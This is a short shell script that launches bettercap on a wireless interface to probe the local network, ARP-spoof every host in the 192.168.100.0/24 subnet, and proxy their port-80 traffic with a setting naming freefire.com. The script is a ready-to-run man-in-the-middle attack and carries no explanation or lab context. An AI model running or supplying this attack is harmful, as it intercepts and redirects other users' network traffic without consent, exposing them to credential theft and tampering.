#!/bin/sh
sudo bettercap -iface wlo1 -eval "net.probe on; set arp.spoof.targets 192.168.100.0/24; set any.proxy.dst_port 80; set any.proxy.src_address freefire.com; arp.spoof on; any.proxy on"
